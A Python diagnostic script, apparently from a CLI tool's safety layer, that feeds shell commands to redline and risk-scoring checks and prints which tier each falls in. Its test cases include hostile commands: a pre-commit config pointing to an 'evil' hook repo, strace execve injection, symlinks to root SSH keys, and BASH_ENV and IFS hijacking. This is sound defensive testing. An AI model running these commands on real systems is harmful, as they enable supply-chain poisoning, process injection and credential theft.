"""诊断 r19 probe 残留 5 MISS + 1 FP 是否真漏/真误。"""
import sys
sys.path.insert(0, "g:/Tuan-CLI")
from tuan_cli.ext.safety_redline import is_hard_redline, is_redline
from tuan_cli.ext.safety_score import SafetyEngine

_engine = SafetyEngine()
_OK = ("HARD", "RED", "CONFIRM")

def tier(cmd):
    if is_hard_redline(cmd):
        return "HARD"
    if is_redline(cmd):
        return "RED"
    r = _engine.score({"command": cmd})
    if str(r.get("risk", "")) in ("high", "critical", "extreme"):
        return "CONFIRM"
    return "ALLOW"

cases = [
    # 写 .pre-commit-config.yaml (供应链投毒) —— 是否应拦?
    "cat > .pre-commit-config.yaml << 'EOF'",
    "cat > .pre-commit-config.yaml << 'EOF'\nrepos:\n  - repo: http://evil/pre-commit-hook",
    # strace inject (进程注入)
    "strace -p 1234 -e inject=execve",
    "strace -p 1234 -e ptrace",
    # 软链到 authorized_keys (敏感路径)
    "ln -sf /root/.ssh/authorized_keys /tmp/target",
    "ln -s /root/.ssh/id_rsa /tmp/key",
    # find -type l 只读枚举软链
    "find /tmp -type l -exec ls -la {} ;",
    "find . -type l -ls",
    # bash 函数导出 + IFS 劫持
    "export IFS=' ' ; evil_function() { /bin/sh; } ; export -f evil_function",
    "export BASH_ENV=/tmp/evil.sh",
    # FP: ln -s 普通应用
    "ln -s /usr/local/bin/app /usr/bin/app",
    "ln -s ~/projects ~/current",
]
for c in cases:
    t = tier(c)
    print(f"  [{t:7}] {c[:70]}")
